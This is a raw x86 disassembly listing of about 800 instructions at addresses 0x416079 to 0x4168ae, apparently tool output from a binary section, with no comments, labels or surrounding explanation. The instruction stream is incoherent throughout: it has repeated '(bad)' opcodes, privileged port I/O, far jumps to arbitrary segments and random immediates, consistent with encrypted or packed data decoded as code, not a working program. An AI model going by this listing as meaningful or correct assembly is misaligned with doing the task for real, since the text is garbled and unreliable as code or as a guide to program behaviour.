  416079:	mov    BYTE PTR ds:0xf8d02639,ah
  41607f:	in     eax,0x85
  416081:	inc    esi
  416082:	adc    ecx,DWORD PTR [edx+edi*2+0x38ceaade]
  416089:	dec    esi
  41608a:	dec    eax
  41608b:	sub    eax,0x94c7b972
  416090:	(bad)  [esi-0x3ab49b6c]
  416096:	inc    eax
  416097:	add    ebp,DWORD PTR [edx]
  416099:	dec    esp
  41609a:	push   ss
  41609b:	jmp    0x8aed:0xfe52
  4160a1:	mov    ch,0x89
  4160a3:	div    DWORD PTR [ebx]
  4160a5:	bound  esp,QWORD PTR [eax+esi*4+0x16d1cb8a]
  4160ac:	in     al,dx
  4160ad:	xor    al,0x5b
  4160af:	mov    esp,0x6f66dfa0
  4160b4:	inc    ecx
  4160b5:	fldenv [ebx]
  4160b7:	int3   
  4160b8:	mov    edi,esi
  4160ba:	lahf   
  4160bb:	and    dh,dh
  4160bd:	xor    ebx,ecx
  4160bf:	jns    0x416099
  4160c1:	into   
  4160c2:	js     0x4160d7
  4160c4:	clc    
  4160c5:	ja     0x416047
  4160c7:	or     DWORD PTR [ebx],edx
  4160c9:	push   ds
  4160ca:	aas    
  4160cb:	pop    ecx
  4160cc:	lock lock pop ebx
  4160cf:	push   edx
  4160d0:	imul   ecx,edx,0x64670e1b
  4160d6:	into   
  4160d7:	push   cs
  4160d8:	add    bl,BYTE PTR [esi]
  4160da:	aam    0x5
  4160dc:	nop
  4160dd:	(bad)  
  4160de:	(bad)  
  4160df:	adc    eax,0x1fc60846
  4160e4:	stos   DWORD PTR es:[edi],eax
  4160e5:	inc    ebx
  4160e6:	mov    bl,0xe1
  4160e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e9:	out    dx,al
  4160ea:	or     al,0xf7
  4160ec:	sub    BYTE PTR [esi-0x2b],dl
  4160ef:	dec    edi
  4160f0:	inc    esi
  4160f1:	ja     0x41614e
  4160f3:	cmp    bh,bl
  4160f5:	jecxz  0x41610b
  4160f7:	in     eax,0xaa
  4160f9:	call   0xf2c82fc7
  4160fe:	das    
  4160ff:	daa    
  416100:	gs (bad) 
  416102:	iret   
  416103:	mov    esp,0x1e6db3be
  416108:	sbb    DWORD PTR [eax+0x2fdad10e],ebp
  41610e:	pop    eax
  41610f:	and    al,0xf
  416111:	adc    cl,BYTE PTR [ebp-0x2716386f]
  416117:	addr16 leave 
  416119:	dec    ebx
  41611a:	scas   eax,DWORD PTR es:[edi]
  41611b:	jmp    0x416177
  41611d:	sub    BYTE PTR [ebp+0x3a773d8e],cl
  416123:	dec    ebx
  416124:	jae    0x416146
  416126:	mov    bh,0x5e
  416128:	lods   al,BYTE PTR ds:[esi]
  416129:	mov    dh,0xb6
  41612b:	lahf   
  41612c:	mov    bh,0x3f
  41612e:	jmp    0xf2e9:0xd9e83004
  416135:	xor    eax,DWORD PTR [edx]
  416137:	push   cs
  416138:	mov    ds:0xb025dc17,al
  41613d:	mov    ebp,0x47300e16
  416142:	test   eax,eax
  416144:	ret    
  416145:	sbb    dl,BYTE PTR [ecx+0x3678d31]
  41614b:	sub    BYTE PTR [eax+0x41df4284],dh
  416151:	(bad)  
  416153:	repnz loop 0x416196
  416156:	inc    ecx
  416157:	mov    ebx,0x9a7bc356
  41615c:	mov    WORD PTR [ebx+ecx*4-0xe27796],fs
  416163:	fxch   st(4)
  416165:	sbb    ebp,edx
  416167:	jmp    0x416169
  416169:	jne    0x41614d
  41616b:	push   esp
  41616c:	add    DWORD PTR [ebp+ebp*8+0x65],edx
  416170:	jnp    0x416134
  416172:	jmp    DWORD PTR [eax+0x2d]
  416175:	xchg   esp,eax
  416176:	sbb    eax,0xff9867c5
  41617b:	aaa    
  41617c:	and    al,0xb9
  41617e:	xchg   esi,eax
  41617f:	inc    eax
  416180:	xor    ebp,DWORD PTR [esi]
  416182:	pop    DWORD PTR [ecx]
  416184:	das    
  416185:	xchg   ecx,eax
  416186:	mov    ebx,0x33872d31
  41618b:	cld    
  41618c:	pop    esp
  41618d:	mov    al,ds:0xf1e3082e
  416192:	add    BYTE PTR [esi-0xa8a6cc2],bh
  416198:	ds or  al,0x50
  41619b:	jno    0x416210
  41619d:	sbb    cl,BYTE PTR [ecx+0x77]
  4161a0:	iret   
  4161a1:	mov    ds:0xf5c10486,al
  4161a6:	out    0x4a,al
  4161a8:	test   DWORD PTR [ebx+0x688c33f2],esp
  4161ae:	xor    ebx,DWORD PTR [di-0x79f]
  4161b3:	rol    DWORD PTR ds:[edi+ecx*2-0x2ebf90b4],cl
  4161bb:	lea    edi,[ebx+edx*8+0x3b]
  4161bf:	push   ebp
  4161c0:	xchg   esi,eax
  4161c1:	mov    edx,0x9e37d5b9
  4161c6:	(bad)  
  4161c8:	call   DWORD PTR [esi+0x7c09d643]
  4161ce:	jmp    0x5ff516d7
  4161d3:	xor    al,BYTE PTR [ebx+ebx*2+0x6b]
  4161d7:	push   edx
  4161d8:	pop    ebx
  4161d9:	out    0x4c,eax
  4161db:	xor    BYTE PTR [esi],0x7c
  4161de:	lea    edi,[eax-0x79]
  4161e1:	std    
  4161e2:	and    eax,0xa485858f
  4161e7:	test   BYTE PTR [ebx+eiz*4],dh
  4161ea:	jg     0x41617a
  4161ec:	xor    ebp,ecx
  4161ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161ef:	lock fild DWORD PTR [ebx]
  4161f2:	pop    ecx
  4161f3:	shl    BYTE PTR [ebp-0x5a2b54d8],0x33
  4161fa:	jns    0x41621b
  4161fc:	ins    BYTE PTR es:[edi],dx
  4161fd:	jge    0x4419ace2
  416203:	sti    
  416204:	pop    ebp
  416205:	and    eax,0x7e0ad793
  41620a:	hlt    
  41620b:	or     BYTE PTR [esi+0x31e1c666],bh
  416211:	or     al,0x64
  416213:	dec    esp
  416214:	push   ebx
  416215:	add    DWORD PTR [eax+0x43],ecx
  416218:	loopne 0x4161f7
  41621a:	inc    edi
  41621b:	in     al,0xd0
  41621d:	or     ch,BYTE PTR [eax+0x5116c9d9]
  416223:	jecxz  0x416240
  416225:	into   
  416226:	jmp    0x71168f5f
  41622b:	pop    edx
  41622c:	cld    
  41622d:	push   ecx
  41622e:	push   eax
  41622f:	aas    
  416230:	add    ebx,esp
  416232:	sbb    al,0xb0
  416234:	mov    ecx,0xfb5d7b19
  416239:	shr    BYTE PTR [esi],cl
  41623b:	mov    BYTE PTR [ebx-0xd],ch
  41623e:	test   al,0xfe
  416240:	inc    ebx
  416241:	pop    edi
  416242:	fbstp  TBYTE PTR [esi+0x5]
  416245:	xchg   DWORD PTR [esi+0x38],ebp
  416248:	adc    al,0xbc
  41624a:	pop    ds
  41624b:	lods   al,BYTE PTR ds:[esi]
  41624c:	adc    eax,0x96a3300a
  416251:	xor    eax,0x6a13c38f
  416256:	lods   eax,DWORD PTR ds:[esi]
  416257:	jl     0x416240
  416259:	dec    edi
  41625a:	or     DWORD PTR [esi+ebp*8-0x5],edi
  41625e:	pop    ecx
  41625f:	mov    eax,ds:0x5f054bf4
  416264:	jle    0x4162c2
  416266:	mov    edi,ds
  416268:	rol    BYTE PTR [ecx+ecx*2],cl
  41626b:	sbb    cl,ch
  41626d:	jno    0x416289
  41626f:	add    dh,ch
  416271:	psubusw mm6,QWORD PTR [ecx]
  416274:	mov    cl,0x9e
  416276:	hlt    
  416277:	call   0x85ca:0xe4c1c993
  41627e:	dec    ecx
  41627f:	pop    esi
  416280:	sbb    DWORD PTR [ebx+0x3e3c826e],esp
  416286:	adc    eax,0x1a123037
  41628b:	imul   edx,ebx,0x9660f6c0
  416291:	mov    ch,0x61
  416293:	stos   DWORD PTR es:[edi],eax
  416294:	jge    0x416227
  416296:	mov    ecx,0x1df65ac3
  41629b:	xchg   esp,eax
  41629c:	push   ss
  41629d:	fstp   TBYTE PTR [esi]
  41629f:	inc    eax
  4162a0:	enter  0x3bb5,0xee
  4162a4:	pusha  
  4162a5:	inc    ebx
  4162a6:	add    esi,DWORD PTR [edi+edi*1]
  4162a9:	push   cs
  4162aa:	gs mov ch,0xd3
  4162ad:	adc    eax,0xc5d255cb
  4162b2:	repz sahf 
  4162b4:	ins    DWORD PTR es:[edi],dx
  4162b5:	adc    ecx,DWORD PTR [edi+0x5c6c11ee]
  4162bb:	and    ah,BYTE PTR [edx+0x4b]
  4162be:	dec    esi
  4162bf:	xor    eax,0x2ca56605
  4162c4:	aam    0x1e
  4162c6:	xor    BYTE PTR [ebx-0x76],dh
  4162c9:	rol    ebp,0xb5
  4162cc:	or     edi,ecx
  4162ce:	adc    eax,0xb39c5266
  4162d3:	and    esi,0xffffffcc
  4162d6:	cmp    bl,cl
  4162d8:	xchg   ecx,eax
  4162d9:	mov    al,0x6c
  4162db:	in     eax,0xb
  4162dd:	jae    0x4162f5
  4162df:	ss push ds
  4162e1:	cli    
  4162e2:	or     al,0xc1
  4162e4:	loopne 0x41628b
  4162e6:	into   
  4162e7:	scas   ax,WORD PTR es:[edi]
  4162e9:	sbb    esi,0x5b8b979a
  4162ef:	mov    cl,0x51
  4162f1:	mov    dh,0x35
  4162f3:	out    dx,eax
  4162f4:	mov    eax,ds:0xb47388d2
  4162f9:	(bad)  
  4162fa:	push   0x85304f1
  4162ff:	icebp  
  416300:	mov    eax,0x33556bd0
  416305:	mov    ah,0x68
  416307:	scas   eax,DWORD PTR es:[edi]
  416308:	pop    ebp
  416309:	mov    edi,0xe5a4f524
  41630e:	adc    bh,bh
  416310:	adc    cl,ch
  416312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416313:	adc    ecx,DWORD PTR [ebx]
  416315:	jae    0x4162b8
  416317:	and    DWORD PTR [edi+ebp*8+0x4e],0xca16c79a
  41631f:	aad    0x22
  416321:	adc    al,ah
  416323:	cwde   
  416324:	xor    dh,BYTE PTR [eax+0x6d]
  416327:	mov    ds:0xd8f8115d,al
  41632c:	mov    ch,0x10
  41632e:	out    dx,al
  41632f:	inc    ebx
  416330:	fs push ecx
  416332:	je     0x41634c
  416334:	add    ch,BYTE PTR [edi-0x37]
  416337:	cmp    ebp,esi
  416339:	shr    BYTE PTR [esi-0x6cf6547d],0x39
  416340:	ins    DWORD PTR es:[edi],dx
  416341:	lods   al,BYTE PTR ds:[esi]
  416342:	scas   eax,DWORD PTR es:[edi]
  416343:	jmp    0xd9b:0x38e43efd
  41634a:	sbb    ebp,DWORD PTR [esi-0x2b]
  41634d:	mov    eax,ecx
  41634f:	in     al,dx
  416350:	pop    ds
  416351:	jns    0x4163a1
  416353:	adc    al,0xf8
  416355:	mov    ecx,0xab61f7d1
  41635a:	loop   0x416344
  41635c:	inc    ebx
  41635d:	inc    edx
  41635e:	iret   
  41635f:	lock stos BYTE PTR es:[edi],al
  416361:	mov    cl,0x27
  416363:	cs daa 
  416365:	push   ecx
  416366:	xchg   ebp,eax
  416367:	pop    edi
  416368:	mov    ah,0xd2
  41636a:	jle    0x4163b0
  41636c:	add    eax,0xb5347721
  416371:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416372:	retf   0x4931
  416375:	push   0xafc4dc7e
  41637a:	pusha  
  41637b:	pop    es
  41637c:	sub    DWORD PTR [ecx+0x7],0xffffffc6
  416380:	retf   0x324
  416383:	add    edi,edx
  416385:	dec    ecx
  416386:	in     al,dx
  416387:	xchg   BYTE PTR [edi+0x55],ah
  41638a:	loope  0x41639e
  41638c:	retf   
  41638d:	ret    
  41638e:	lea    esp,[edi-0x6512d5a8]
  416394:	addr16 dec ax
  416397:	arpl   WORD PTR [ebp-0x4c3daa9b],sp
  41639d:	rcr    DWORD PTR [esi-0xdb6042f],cl
  4163a3:	mov    ch,0xc5
  4163a5:	mov    ds:0xd2722263,eax
  4163aa:	pop    ecx
  4163ab:	sbb    eax,0x74fe4f58
  4163b0:	fld    QWORD PTR [edi-0x64]
  4163b3:	test   eax,0xba09753d
  4163b8:	dec    ecx
  4163b9:	rcl    bl,1
  4163bb:	daa    
  4163bc:	fcmovu st,st(3)
  4163be:	sub    ebp,DWORD PTR [edi-0x2f]
  4163c1:	add    al,0x7c
  4163c3:	add    eax,esi
  4163c5:	inc    eax
  4163c6:	xchg   esp,eax
  4163c7:	inc    esp
  4163c8:	enter  0xe89b,0x5a
  4163cc:	(bad)  
  4163cd:	jnp    0x4163e3
  4163cf:	aaa    
  4163d0:	(bad)  
  4163d1:	test   DWORD PTR [ecx-0xa],0x638ab699
  4163d8:	das    
  4163d9:	inc    ecx
  4163da:	ins    BYTE PTR es:[edi],dx
  4163db:	lds    ecx,FWORD PTR [bx+di]
  4163de:	bound  edx,QWORD PTR [eax]
  4163e0:	sub    ebx,DWORD PTR [esi+0x7fa099e8]
  4163e6:	and    BYTE PTR [edx],ah
  4163e8:	inc    ebp
  4163e9:	jge    0x416426
  4163eb:	pop    eax
  4163ec:	lss    edi,FWORD PTR [esi-0x6fc3a042]
  4163f3:	arpl   WORD PTR [ecx-0x5d80f0da],sp
  4163f9:	(bad)
  4163fd:	xor    dl,BYTE PTR [edi]
  4163ff:	(bad)  
  416400:	into   
  416401:	shl    DWORD PTR [edx],1
  416403:	arpl   WORD PTR [ebp+0x29497e14],sp
  416409:	sub    eax,0x6753d2fe
  41640e:	push   edi
  41640f:	test   eax,0xb1a66894
  416414:	ror    DWORD PTR [ebx+0x78],0x3f
  416418:	dec    esi
  416419:	sbb    eax,0x569ac4c1
  41641e:	jg     0x41645a
  416420:	mov    ?,WORD PTR [ebx+0x57b5d01b]
  416426:	or     al,0xb5
  416428:	pop    ss
  416429:	and    eax,0x195f089e
  41642e:	iret   
  41642f:	shl    BYTE PTR [edx+0x4bbaf57f],1
  416435:	mov    ds:0xa147c8cb,eax
  41643a:	retf   0x2798
  41643d:	fcomp  QWORD PTR [ebx+eax*1+0x25]
  416441:	stos   BYTE PTR es:[edi],al
  416442:	es and eax,0xc95e767b
  416448:	cs jbe 0x4163ec
  41644b:	fisttp WORD PTR [ecx]
  41644d:	mov    ah,0x23
  41644f:	sub    esi,eax
  416451:	not    DWORD PTR [edx]
  416453:	sub    eax,0x6fffc064
  416458:	inc    BYTE PTR [edi]
  41645a:	(bad)  
  41645b:	mov    cl,0x54
  41645d:	push   0x87f1600c
  416462:	test   dl,bh
  416464:	aaa    
  416465:	dec    eax
  416466:	lfs    ecx,FWORD PTR [edi]
  416469:	repnz loop 0x4164cd
  41646c:	push   ebp
  41646d:	mov    bh,0x10
  41646f:	(bad)  
  416470:	je     0x416469
  416472:	xchg   ebp,eax
  416473:	call   DWORD PTR [edi]
  416475:	test   DWORD PTR [ecx],esi
  416477:	leave  
  416478:	mov    ds:0x4566aa66,eax
  41647d:	adc    al,0x9c
  41647f:	popa   
  416480:	add    eax,0x4aad1f95
  416485:	mov    ch,cl
  416487:	xchg   DWORD PTR [ebx+0x1d01dd96],ecx
  41648d:	push   esp
  41648e:	push   esp
  41648f:	jmp    0x41641b
  416491:	outs   dx,DWORD PTR ds:[esi]
  416492:	sbb    al,0x8e
  416494:	aas    
  416495:	xchg   ebx,eax
  416496:	iret   
  416497:	retf   0xd579
  41649a:	stc    
  41649b:	jle    0x41644f
  41649d:	pop    edx
  41649e:	add    eax,0xbc752eb4
  4164a3:	data16 jae 0x41651c
  4164a6:	dec    edi
  4164a7:	pop    ds
  4164a8:	jmp    0xebec846
  4164ad:	je     0x416438
  4164af:	inc    esi
  4164b0:	dec    edi
  4164b1:	cld    
  4164b2:	test   al,0xf5
  4164b4:	mov    dh,0x2a
  4164b6:	mov    ebx,ebx
  4164b8:	xchg   ecx,eax
  4164b9:	jae    0x4164d4
  4164bb:	xchg   cl,dh
  4164bd:	mov    dh,0xa3
  4164bf:	or     esi,eax
  4164c1:	(bad)  
  4164c3:	pop    es
  4164c4:	jp     0x416494
  4164c6:	scas   al,BYTE PTR es:[edi]
  4164c7:	ds xchg esi,eax
  4164c9:	xor    BYTE PTR [ecx+0x5788eba2],al
  4164cf:	jmp    0xed8bfa8a
  4164d4:	xor    bh,dh
  4164d6:	push   eax
  4164d7:	fcmovne st,st(1)
  4164d9:	ror    DWORD PTR [edx],1
  4164db:	cs enter 0xbafe,0xc3
  4164e0:	je     0x41653b
  4164e2:	adc    bl,BYTE PTR [esi+0x3192878e]
  4164e8:	rcr    BYTE PTR [edi-0x8],1
  4164eb:	stos   DWORD PTR es:[edi],eax
  4164ec:	rol    DWORD PTR [edi-0xb],cl
  4164ef:	adc    eax,DWORD PTR [edx]
  4164f1:	xor    ah,BYTE PTR [ebx]
  4164f3:	xchg   BYTE PTR [eax+0x50],dl
  4164f6:	mov    esp,0x8fab20de
  4164fb:	inc    ebp
  4164fc:	xchg   esp,eax
  4164fd:	sub    dh,bl
  4164ff:	dec    esp
  416500:	cmp    DWORD PTR [edx],edi
  416502:	fistp  QWORD PTR [ecx+eax*4-0x450c2aee]
  416509:	iret   
  41650a:	inc    ecx
  41650b:	outs   dx,BYTE PTR ds:[esi]
  41650c:	mov    ds:0x69749378,eax
  416511:	push   edi
  416512:	scas   al,BYTE PTR es:[edi]
  416513:	inc    DWORD PTR [ebx+0x24]
  416516:	clc    
  416517:	pop    esp
  416518:	cmp    eax,0x69a9dff9
  41651d:	or     DWORD PTR [edx+0x49],eax
  416520:	aad    0x5a
  416522:	xor    al,0x97
  416524:	sbb    eax,0xfb6811db
  416529:	mov    esi,0x32d0ec34
  41652e:	xor    DWORD PTR [eax-0x9371db4],edx
  416534:	call   0x8fccca4f
  416539:	outs   dx,BYTE PTR ds:[esi]
  41653a:	pop    es
  41653b:	out    dx,al
  41653c:	mov    esi,0x893928ce
  416541:	mov    ds:0x840b7609,eax
  416546:	sbb    ah,dh
  416548:	pusha  
  416549:	mov    ch,0x7e
  41654b:	sbb    ebp,DWORD PTR [edi+edx*1]
  41654e:	ret    
  41654f:	lds    esp,FWORD PTR [eax+0x7c4af846]
  416555:	push   edi
  416556:	loope  0x416501
  416558:	mov    ah,0x4d
  41655a:	jbe    0x4165c9
  41655c:	push   ecx
  41655d:	cmp    DWORD PTR [edi+edi*4],eax
  416560:	mov    dh,al
  416562:	sbb    DWORD PTR [eax-0x23],0xffffffa5
  416566:	sti    
  416567:	mov    BYTE PTR [ebx-0x142ebb74],bl
  41656d:	stos   DWORD PTR es:[edi],eax
  41656e:	jmp    0x4165c3
  416570:	adc    ebx,esp
  416572:	fcomp  QWORD PTR [ecx+0x5787022d]
  416578:	popa   
  416579:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657a:	push   edx
  41657b:	imul   ecx,edx,0x1a
  41657e:	jecxz  0x416562
  416580:	or     al,0x26
  416582:	or     ecx,edi
  416584:	fdiv   DWORD PTR ds:0xac979a00
  41658a:	mov    ch,0x33
  41658c:	xor    cl,dh
  41658e:	inc    esi
  41658f:	dec    edx
  416590:	pushf  
  416591:	inc    esp
  416592:	pop    ebp
  416593:	icebp  
  416594:	mov    ch,0x2
  416596:	add    dh,BYTE PTR [esi]
  416598:	shr    BYTE PTR [edx],1
  41659a:	push   esi
  41659b:	mov    eax,es
  41659d:	dec    ebx
  41659e:	inc    eax
  41659f:	jbe    0x41660d
  4165a1:	iret   
  4165a2:	repz (bad) 
  4165a4:	pusha  
  4165a5:	mov    al,ds:0x6d61013e
  4165aa:	test   DWORD PTR [eax-0x9165f62],ebp
  4165b0:	adc    esp,DWORD PTR [esi+0x4c58d78a]
  4165b6:	xchg   ecx,eax
  4165b7:	sar    BYTE PTR [ebp-0x60],0x52
  4165bb:	ds xchg ebp,eax
  4165bd:	ins    BYTE PTR es:[edi],dx
  4165be:	xchg   edi,edi
  4165c0:	push   0x51
  4165c2:	and    dh,bl
  4165c4:	pop    es
  4165c5:	inc    ebp
  4165c6:	jmp    0x416583
  4165c8:	xchg   ebx,eax
  4165c9:	push   ds
  4165ca:	lods   eax,DWORD PTR ds:[esi]
  4165cb:	mov    dl,0xeb
  4165cd:	test   DWORD PTR [esi-0x292d3057],eax
  4165d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d4:	addr16 sub cl,cl
  4165d7:	or     al,0x8
  4165d9:	stos   BYTE PTR es:[edi],al
  4165da:	and    bl,BYTE PTR [edx+0x49b27b3d]
  4165e0:	xchg   bl,cl
  4165e2:	cmp    eax,0xead3166d
  4165e7:	push   es
  4165e8:	fstp   DWORD PTR [esi]
  4165ea:	ret    
  4165eb:	push   ebp
  4165ec:	mov    bh,0x75
  4165ee:	mov    edi,0xc661e72f
  4165f3:	cmp    eax,0xb1cf3dc1
  4165f8:	mov    edx,0x17dca9d
  4165fd:	aaa    
  4165fe:	mov    DWORD PTR [ebp-0x16],eax
  416601:	call   0xebbb:0x3dcfdd66
  416608:	mov    ds:0x4014d17b,eax
  41660d:	dec    edi
  41660e:	icebp  
  41660f:	sar    BYTE PTR [ecx+0x19b21ec9],0xf8
  416616:	in     eax,dx
  416617:	ss jns 0x4165dc
  41661a:	or     al,0x49
  41661c:	mov    ebx,0x3a5c2fb0
  416621:	test   eax,0xe243ab27
  416626:	jmp    0x2a3f:0xf49aff58
  41662d:	jae    0x4166a3
  41662f:	cs xchg edi,eax
  416631:	ds pop ds
  416633:	dec    edx
  416634:	inc    DWORD PTR [edi]
  416636:	mov    esp,0x3a875fb0
  41663b:	lods   al,BYTE PTR ds:[esi]
  41663c:	leave  
  41663d:	fs aas 
  41663f:	sub    edi,DWORD PTR [edi]
  416641:	and    BYTE PTR [edx+0x270e34f3],bh
  416647:	xor    dl,BYTE PTR [edx+0x7b]
  41664a:	and    BYTE PTR [eax-0x76],bl
  41664d:	mov    esp,0x8d7d9a7e
  416652:	mov    ds:0x1f05a4e5,al
  416657:	arpl   WORD PTR [edx+0x2c],bx
  41665a:	pop    ebx
  41665b:	mov    gs,WORD PTR [ecx-0xf]
  41665e:	adc    ebp,DWORD PTR [edi+0x7ca4cbf]
  416664:	or     ah,al
  416666:	xor    al,0x8
  416668:	xlat   BYTE PTR ds:[ebx]
  41666a:	jmp    0x5e4fd91e
  41666f:	and    al,0x53
  416671:	nop
  416672:	jle    0x4166df
  416674:	jnp    0x416616
  416676:	imul   edi,DWORD PTR [ecx+edx*2],0xfffffff4
  41667a:	dec    ebp
  41667b:	add    al,0xfd
  41667d:	push   eax
  41667e:	or     esp,esi
  416680:	mov    dl,0x68
  416682:	pop    ebp
  416683:	in     eax,dx
  416684:	daa    
  416685:	inc    eax
  416686:	mov    ecx,0x51908b6e
  41668b:	push   cs
  41668c:	or     DWORD PTR [edi-0x54a0a630],esp
  416692:	mov    ds,WORD PTR [ecx]
  416694:	cmp    ch,dl
  416696:	xchg   esp,eax
  416697:	and    al,0x47
  416699:	cs cmp cl,bh
  41669c:	jb     0x416681
  41669e:	jnp    0x416693
  4166a0:	test   eax,0x8fd92f39
  4166a5:	aam    0xfe
  4166a7:	xor    BYTE PTR [ebx],dl
  4166a9:	push   esi
  4166aa:	test   al,dl
  4166ac:	lods   al,BYTE PTR ds:[esi]
  4166ad:	mov    cl,0xac
  4166af:	and    BYTE PTR [ecx+ebx*8+0x40],cl
  4166b3:	inc    ebx
  4166b4:	xchg   bl,ch
  4166b6:	ins    BYTE PTR es:[edi],dx
  4166b7:	int3   
  4166b8:	mov    edi,0xfacf1792
  4166bd:	and    eax,0x226cb5a6
  4166c2:	sar    BYTE PTR [ebp+0x380e922d],0xfa
  4166c9:	aas    
  4166ca:	cmp    al,bl
  4166cc:	fnstcw WORD PTR [edx]
  4166ce:	mov    bh,0x58
  4166d0:	adc    eax,0x30d2f3a8
  4166d5:	loope  0x41674e
  4166d7:	add    BYTE PTR [esi-0x3a25825a],ch
  4166dd:	jae    0x41666e
  4166df:	and    bl,BYTE PTR [edi+0x758024ef]
  4166e5:	adc    DWORD PTR [ebp*4+0x1ea1b099],edx
  4166ec:	sub    eax,0x21e9ddbe
  4166f1:	mov    edi,0x3438205c
  4166f6:	dec    ebp
  4166f7:	data16 jnp 0x416723
  4166fa:	dec    eax
  4166fb:	jns    0x416735
  4166fd:	es inc bh
  416700:	pop    ss
  416701:	jecxz  0x4166d0
  416703:	call   0x7382fd69
  416708:	and    cl,BYTE PTR [esi-0x31]
  41670b:	ins    DWORD PTR es:[edi],dx
  41670c:	push   es
  41670d:	out    0x6e,al
  41670f:	iret   
  416710:	mov    ecx,0xf0a93ec7
  416715:	in     eax,dx
  416716:	mov    ebp,0x475cc001
  41671b:	inc    esp
  41671c:	(bad)
  41671f:	or     al,0x51
  416721:	cmp    eax,0x536a531
  416726:	add    al,0xb4
  416728:	(bad)  
  41672a:	mov    edx,0x8e0e9f22
  41672f:	pop    esi
  416730:	adc    eax,0x7dc6c73f
  416735:	push   esi
  416736:	cmp    edi,DWORD PTR [edi-0x5eb0ef11]
  41673c:	test   BYTE PTR [ecx-0x7f],dh
  41673f:	std    
  416740:	imul   ebp,DWORD PTR [esi],0x80c7869b
  416746:	fldl2e 
  416748:	pop    esi
  416749:	clc    
  41674a:	push   edi
  41674b:	mov    eax,ds:0x45862c22
  416750:	sub    al,0x9f
  416752:	cmp    BYTE PTR [edx-0x3a],dh
  416755:	lods   eax,DWORD PTR ds:[esi]
  416756:	mov    dl,ch
  416758:	sbb    BYTE PTR [ebx+0x4f4261ca],al
  41675e:	pop    edx
  41675f:	cmp    ebp,0x9cb98990
  416765:	cld    
  416766:	inc    ecx
  416767:	inc    edx
  416768:	jne    0x41677a
  41676a:	rol    BYTE PTR [edx],1
  41676c:	jg     0x416772
  41676e:	stos   DWORD PTR es:[edi],eax
  41676f:	shl    BYTE PTR [edx+0x39131948],0x96
  416776:	jecxz  0x4167ee
  416778:	jge    0x416736
  41677a:	fstp   TBYTE PTR [ebx+0x5e]
  41677d:	sar    BYTE PTR [ecx],0xb3
  416780:	mov    ch,0x18
  416782:	vcvtss2sd xmm4,xmm0,xmm6
  416786:	bound  esi,QWORD PTR [ecx-0x73]
  416789:	xchg   ecx,eax
  41678a:	mov    ebp,es
  41678c:	jecxz  0x41677b
  41678e:	inc    ebx
  41678f:	(bad)  
  416790:	iret   
  416791:	push   ecx
  416792:	push   edx
  416793:	sub    al,0xdb
  416795:	aaa    
  416796:	cmp    BYTE PTR [ebx+eiz*2+0x3e],0x38
  41679b:	push   0x5481cc6
  4167a0:	scas   eax,DWORD PTR es:[edi]
  4167a1:	mov    WORD PTR [esi-0x39],cs
  4167a4:	push   0x8b7db11b
  4167a9:	mov    ch,0xb4
  4167ab:	add    bl,BYTE PTR ds:0x1b4a3444
  4167b1:	mov    ebx,0x462fda4e
  4167b6:	xor    al,0x7
  4167b8:	(bad)  
  4167b9:	shl    BYTE PTR [ebp-0x3b431b71],1
  4167bf:	sbb    eax,0x18a8b9ee
  4167c4:	aas    
  4167c5:	xor    DWORD PTR [edx+esi*2+0x6239b8c0],esi
  4167cc:	xlat   BYTE PTR ds:[ebx]
  4167cd:	js     0x4167a5
  4167cf:	imul   ebp,DWORD PTR ds:0xaa242f57,0x5adfc866
  4167d9:	lea    edi,[eax-0x2c]
  4167dc:	cmp    bl,BYTE PTR [ebx]
  4167de:	add    al,0x7f
  4167e0:	xchg   BYTE PTR [ecx],al
  4167e2:	int    0x94
  4167e4:	pop    ds
  4167e5:	mov    ah,0xe
  4167e7:	mov    eax,0x12543b30
  4167ec:	cmp    BYTE PTR [ebx+0x48],0x7e
  4167f0:	jmp    0x95f7:0xcfb3a4ea
  4167f7:	rol    BYTE PTR [edi+0x2c032811],0x7b
  4167fe:	es cmp al,0xff
  416801:	fdiv   QWORD PTR [edx]
  416803:	or     al,0xbe
  416805:	dec    ebp
  416806:	dec    eax
  416807:	ins    BYTE PTR es:[edi],dx
  416808:	mov    ebx,0xb62df31
  41680d:	es sbb ebx,eax
  416810:	test   eax,0x6516b59
  416815:	call   0x646bdd84
  41681a:	and    cl,BYTE PTR [edi]
  41681c:	jle    0x416869
  41681e:	fild   DWORD PTR [edx+eax*8]
  416821:	js     0x41685c
  416823:	lock push ecx
  416825:	sbb    eax,0xa45fc6d0
  41682a:	or     BYTE PTR [ecx+edx*8-0x66],ah
  41682e:	shl    esp,1
  416830:	mov    WORD PTR [eax+edx*1-0x7],?
  416834:	repnz mov dh,0x7c
  416837:	and    al,0xa7
  416839:	inc    eax
  41683a:	sti    
  41683b:	mov    BYTE PTR [eax+esi*2+0x11bbfba8],0x5e
  416843:	in     eax,0x4e
  416845:	test   al,0xce
  416847:	test   eax,0x9fdc1dce
  41684c:	cmp    BYTE PTR [eax+0x7d28fe13],ch
  416852:	(bad)  
  416853:	repz into 
  416855:	std    
  416856:	hlt    
  416857:	xchg   esp,eax
  416858:	sbb    BYTE PTR [esi+0x18d3e74b],bl
  41685e:	aaa    
  41685f:	aam    0x2b
  416861:	pop    esi
  416862:	arpl   WORD PTR [ecx+0x76],bp
  416865:	repz mov eax,0xbf7beacc
  41686b:	addr16 das 
  41686d:	test   BYTE PTR [edx+0x74],cl
  416870:	jmp    0xfca:0xd15ea52e
  416877:	pop    edx
  416878:	retf   
  416879:	lds    ecx,FWORD PTR [eax-0x5e]
  41687c:	and    DWORD PTR [edi-0x1310e09f],ecx
  416882:	test   DWORD PTR [ebp+0x29],edx
  416885:	add    BYTE PTR [eax],dh
  416887:	pop    ss
  416888:	jmp    0x874d:0x3f891c6d
  41688f:	xchg   edx,eax
  416890:	cdq    
  416891:	test   DWORD PTR [esi-0x5a],esi
  416894:	(bad)  
  416896:	cs and al,0xd1
  416899:	fistp  QWORD PTR [edi-0x2567d24]
  41689f:	daa    
  4168a0:	add    al,dl
  4168a2:	xor    DWORD PTR [ebx],ecx
  4168a4:	jns    0x4168e8
  4168a6:	in     al,dx
  4168a7:	ror    BYTE PTR [esi-0x55937a9],0x16
  4168ae:	jmp    0x171e:0x4c1a7d02
